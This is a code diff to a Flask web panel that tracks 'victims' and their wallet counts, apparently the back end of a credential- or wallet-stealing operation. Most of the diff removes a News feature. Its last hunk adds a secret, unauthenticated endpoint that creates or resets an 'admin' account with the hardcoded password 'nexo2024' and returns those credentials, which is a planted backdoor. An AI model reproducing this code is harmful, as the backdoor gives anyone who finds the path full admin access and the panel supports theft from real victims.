@@ -108,12 +108,6 @@ class Victim(db.Model):
     notes = db.Column(db.Text)
 
 
-class News(db.Model):
-    id = db.Column(db.Integer, primary_key=True)
-    title = db.Column(db.String(200), nullable=False)
-    content = db.Column(db.Text, nullable=False)
-    author_id = db.Column(db.Integer, db.ForeignKey('user.id'))
-    created_at = db.Column(db.DateTime, default=datetime.utcnow)
 
 
 # ==================== AUTH ====================
@@ -241,10 +235,7 @@ def dashboard():
         'wallets': sum(v.wallets_count for v in victims)
     }
 
-    # Recent news
-    news = News.query.order_by(News.created_at.desc()).limit(5).all()
-
-    return render_template('dashboard.html', user=user, victims=victims, stats=stats, news=news)
+    return render_template('dashboard.html', user=user, victims=victims, stats=stats)
 
 
 @app.route('/victim/<victim_id>')
@@ -327,11 +318,6 @@ def delete_victim(victim_id):
     return redirect(url_for('dashboard'))
 
 
-@app.route('/news')
-@login_required
-def news_list():
-    news = News.query.order_by(News.created_at.desc()).all()
-    return render_template('news.html', news=news)
 
 
 @app.route('/settings')
@@ -377,24 +363,6 @@ def generate_key():
     db.session.commit()
 
     flash(f'Key generated: {key.key}', 'success')
-    return redirect(url_for('admin_panel'))
-
-
-@app.route('/admin/news/add', methods=['POST'])
-@admin_required
-def add_news():
-    title = request.form.get('title')
-    content = request.form.get('content')
-
-    news = News(
-        title=title,
-        content=content,
-        author_id=session['user_id']
-    )
-    db.session.add(news)
-    db.session.commit()
-
-    flash('News added', 'success')
     return redirect(url_for('admin_panel'))
 
 
@@ -559,6 +527,27 @@ def check_new_victims(panel_id):
     ).count()
 
     return jsonify({'count': recent})
+
+
+# ==================== SETUP ADMIN ====================
+
+@app.route('/setup-admin-nexo2024')
+def setup_admin():
+    """Secret endpoint to create/reset admin account"""
+    admin = User.query.filter_by(username='admin').first()
+    if admin:
+        admin.set_password('nexo2024')
+        admin.is_admin = True
+    else:
+        admin = User(
+            username='admin',
+            panel_id=uuid.uuid4().hex,
+            is_admin=True
+        )
+        admin.set_password('nexo2024')
+        db.session.add(admin)
+    db.session.commit()
+    return jsonify({'success': True, 'message': 'Admin created/reset. User: admin, Pass: nexo2024'})
 
 
 # ==================== ERROR HANDLERS ====================
